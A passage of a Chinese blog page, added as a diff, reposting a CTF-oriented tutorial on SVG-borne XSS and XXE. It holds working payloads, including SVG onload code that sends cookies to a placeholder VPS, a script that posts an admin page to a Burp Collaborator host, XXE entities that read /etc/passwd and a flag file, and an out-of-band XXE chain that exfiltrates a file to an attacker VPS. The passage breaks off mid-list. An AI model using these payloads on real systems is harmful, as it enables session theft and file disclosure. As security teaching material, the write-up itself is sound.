@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.getflag.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言文章首发合天：传送门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【转载】浅谈SVG的两个黑魔法">
+<meta property="og:url" content="https://www.getflag.cn/2020/11/06/%E6%B5%85%E8%B0%88SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/index.html">
+<meta property="og:site_name" content="kawhi&#39;s Blog">
+<meta property="og:description" content="前言文章首发合天：传送门">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201022085742350.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102172112942.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102212749933.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102212656829.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102171516321.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102170955296.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031171541673.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031173350983.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031174136650.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031130640113.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031130513819.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201027231920483.png">
+<meta property="article:published_time" content="2020-11-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-19T06:09:08.339Z">
+<meta property="article:author" content="kawhi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201022085742350.png">
+
+<link rel="canonical" href="https://www.getflag.cn/2020/11/06/%E6%B5%85%E8%B0%88SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【转载】浅谈SVG的两个黑魔法 | kawhi's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kawhi's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">年轻人不讲武德</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fab fa-pagelines fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/11/06/%E6%B5%85%E8%B0%88SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="PHP是世界上最好的语言">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【转载】浅谈SVG的两个黑魔法
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-06 00:00:00" itemprop="dateCreated datePublished" datetime="2020-11-06T00:00:00+08:00">2020-11-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-19 14:09:08" itemprop="dateModified" datetime="2020-11-19T14:09:08+08:00">2020-11-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a target="_blank" rel="noopener" href="https://www.hetianlab.com/specialized/20201106104206">传送门</a><a id="more"></a></p>
+<p>之前在CTF比赛中遇到了一些关于SVG造成的安全问题，多亏诸多师傅的题目给我的一顿痛打让我又了解了不少新的知识和SVG在WEB安全中的应用，拓展了我的攻击面。</p>
+<h2 id="SVG简介"><a href="#SVG简介" class="headerlink" title="SVG简介"></a>SVG简介</h2><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg/png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p>
+<h2 id="SVG造成XSS"><a href="#SVG造成XSS" class="headerlink" title="SVG造成XSS"></a>SVG造成XSS</h2><h3 id="直奔主题"><a href="#直奔主题" class="headerlink" title="直奔主题"></a>直奔主题</h3><p>我们在一张SVG图片里面插入一个JavaScript代码。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们用浏览器打开它会发现它会造成XSS。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201022085742350.png" alt="image-20201022085742350"></p>
+<h3 id="刨根问底"><a href="#刨根问底" class="headerlink" title="刨根问底"></a>刨根问底</h3><p>为什么这样的SVG图片会造成跨站脚本问题呢？这是因为SVG是支持通过脚本语言来动态访问和修改SVG的任何内容，这点和HTML中的DOM类似，或者说完全一致。因为SVG中的所有标签和属性都已经对应了已经定义的DOM，而这种脚本语言就是<code>JavaScript</code>，所以我们在SVG中插入<code>JavaScript</code>脚本是完全能够被解析的。</p>
+<p>可以看到在国际的SVG标准中定义了script标签的存在，<strong>总之XSS之所以能够执行是因为遵循了svg及xml的标准</strong>。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102172112942.png" alt="image-20201102172112942"></p>
+<p>那么假设存在一个能够上传SVG的WEB服务器，并且没有对SVG内容进行严格过滤，这就很有可能造成XSS问题。</p>
+<h3 id="CTF中的应用场景"><a href="#CTF中的应用场景" class="headerlink" title="CTF中的应用场景"></a>CTF中的应用场景</h3><p>XSSME</p>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://xssrf.hackme.inndy.tw/">https://xssrf.hackme.inndy.tw/</a></p>
+<p>本题是给admin发一封邮件，然后admin会查看你发送的邮件，很明显的xss盗取管理员cookie，但是这里经过fuzz发现过滤了如下字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">)</span><br><span class="line">onmouseover</span><br><span class="line">空格onload</span><br><span class="line">空格onerror</span><br><span class="line">&lt;iframe</span><br></pre></td></tr></table></figure>
+
+<p>我们这里可以考虑用SVG来进行XSS，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以发送到VPS测试一下是否有效</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;vps-ip:1234&#39;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102212749933.png" alt="image-20201102212749933"></p>
+<p>vps成功接收到信息</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102212656829.png" alt="image-20201102212656829"></p>
+<p>然后再获取cookie即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;vps-ip:1234&#x2F;?&#39;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Teaser Confidence CTF 2019：Web 50</p>
+<p>本题是一道比较经典的利用svg去构造xss的题目，但是由于题目并没有开源，所以没办法复现，这里主要学习他的思路。</p>
+<p>根据题目描述，有两个功能，一个是报告BUG，一个是修改个人信息，然后管理员会查看该域名下的某处页面，这里主要是通过xss获取admin页面Secret表单的值来获取flag。</p>
+<p>在个人资料页面中，我们可以将头像上传到服务器，服务器将检查此文件是否为有效图像，并且大小必须为100x100。我们如果将有效的PNG图片重命名为1.html，然后上传。但是，HTTP内容类型仍为<code>image/png</code>，那么这里有个问题就是如果内容类型为<code>image/png</code>，则将此链接发送给admin不会触发XSS有效负载。</p>
+<p>所以这里就可以使用svg作为媒介来构造xss，去获取secret的值，这里直接贴一下payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; id=&quot;Layer_1&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;-12.5 -12.5 100 100&quot; xml:space=&quot;preserve&quot;&gt; </span><br><span class="line">  ...</span><br><span class="line">  &lt;g&gt;</span><br><span class="line">    &lt;polygon fill=&quot;#00B0D9&quot; points=&quot;41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 &quot;&gt;&lt;/polygon&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">      var xhr = new XMLHttpRequest();</span><br><span class="line">      xhr.onreadystatechange = function() &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">          var xhr2 = new XMLHttpRequest();</span><br><span class="line">          xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://XXXX.burpcollaborator.net/&quot;</span>);</span><br><span class="line">          xhr2.send(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;   </span><br><span class="line">      xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://web50.zajebistyc.tf/profile/admin&quot;</span>);</span><br><span class="line">      xhr.withCredentials = true;</span><br><span class="line">      xhr.send();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/g&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了burpcollaborator来外带数据，Burp Suite在1.7之后的版本自带了这个功能，获取burpcollaborator的地址如图所示：</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102171516321.png" alt="image-20201102171516321"></p>
+<p>最后在Reportbug处提交图片即可获得flag，这里借用一下郁离歌师傅的图。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102170955296.png" alt="image-20201102170955296"></p>
+<h2 id="SVG造成XXE"><a href="#SVG造成XXE" class="headerlink" title="SVG造成XXE"></a>SVG造成XXE</h2><p>前面说了SVG是基于XML的矢量图，因此可以支持Entity(实体)功能，因此可以用来XXE。</p>
+<h3 id="CTF中的应用场景-1"><a href="#CTF中的应用场景-1" class="headerlink" title="CTF中的应用场景"></a>CTF中的应用场景</h3><p>这里从两道经典的CTF题目来学习如何XXE并且结合SVG，这里分为有回显和无回显两种情况。</p>
+<h4 id="有回显的情况"><a href="#有回显的情况" class="headerlink" title="有回显的情况"></a>有回显的情况</h4><p>svgmagic(BsidesSF CTF 2019)</p>
+<p>github题目源码：<a target="_blank" rel="noopener" href="https://github.com/BSidesSF/ctf-2019-release/tree/master/challenges/svgmagic">传送门</a></p>
+<p>buu平台也有上这道题目</p>
+<p>打开页面</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031171541673.png" alt="image-20201031171541673"></p>
+<p>打开页面就提示Convert SVG to PNG with Magic</p>
+<p>这里我们首先想到的思路就是文件上传那些步骤，一句话木马以及<code>.htaccess</code>等等，但是多次上传利用无果，因为会报一个500的错误，这里的话可以利用SVG配合XXE去读取他的一个文件。</p>
+<p>我们直接读取<code>/etc/passwd</code>试一下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们把上面这段代码保存为1.svg，并上传。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031173350983.png" alt="image-20201031173350983"></p>
+<p>可以发现成功回显了带有<code>/etc/passwd</code>内容的图片，但是图像太小，无法容纳所有内容，这里我们可以调整他的width宽度，调大一点就可以看到所有的内容了。</p>
+<p>还有个问题就是我们并不知道flag的路径，而/proc/self/pwd/代表的是当前路径，可以构造/proc/self/pwd/flag.txt读取文件。</p>
+<p>最后payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们保存为2.svg上传，发现成功读取到flag。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031174136650.png" alt="image-20201031174136650"></p>
+<h4 id="无回显的情况"><a href="#无回显的情况" class="headerlink" title="无回显的情况"></a>无回显的情况</h4><p>在说这个点之前，我们先来看看普通XXE无回显是如何外带数据的，这里我在本地演示一下：</p>
+<p>先在本地PHPStudy写入无回显处理XML的代码</p>
+<p>xml.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在自己的VPS上放置</p>
+<p>xml.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;WINDOWS&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip:1234&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里有几个需要注意的点：</p>
+<p>ip换成自己的vps的ip</p>
+<p>这里的<code>&amp;#x25;</code>会被xml解析成<code>%</code>，如果直接用<code>%</code>的话我本地会报错。</p>
+<p>注意这里使用伪协议读取文件内容，是因为xml解析器支持使用<code>php://filter</code>进行编码，至于为什么要使用伪协议对内容进行一个编码呢，我自己在本地做测试的时候，发现如果文件的内容如果只是简单的字母数字不加伪协议也可以，但是一旦带有换行或者特殊的符号就会爆一个<code>warning invaild url</code>，所以保险起见还是加上，最后对文件内容做一个base64的解码就行。</p>
+<p>最后我们POST提交的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Note [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;xml.dtd&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %start;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的ip同样换成自己的vps的ip</p>
+<p>下一步在VPS上开启监听1234端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>然后我们抓xml.php的POST包并发送payload</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031130640113.png" alt="image-20201031130640113"></p>
+<p>可以看到在vps上成功接收到了我本地<code>C:/WINDOWS/win.ini</code>这个文件的内容。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031130513819.png" alt="image-20201031130513819"></p>
+<p>我们来梳理一下他的整个调用过程</p>
+<ol>
+<li>首先我们payload中的<code>% remote</code>去获取vps上的xml.dtd</li>
+<li>然后xml.dtd中的<code>% start</code>去调用<code>% file</code></li>
+<li><code>% file</code>获取服务器上的<code>C:/WINDOWS/win.ini</code>文件并将他base64编码</li>
+<li>最后通过<code>% send</code>将数据发送到vps监听的1234端口上</li>
+</ol>
+<p>这就是XXE实现外带数据的整个流程，那么这个如何结合SVG呢，这里通过一道我之前打比赛的一道题为例子：</p>
+<p>svgggggg!(DozerCTF2020)</p>
+<p>这道题当时比赛的时候没有做出来，因为当时水平有限，并没有想到svg也是xml格式，可以用来XXE，这道题确实质量可以，学到了很多新的姿势，下面给出我复现的过程。</p>
+<p>题目给的两个hint：</p>
+<ul>
+<li>用户r1ck的操作记录在哪儿来着</li>
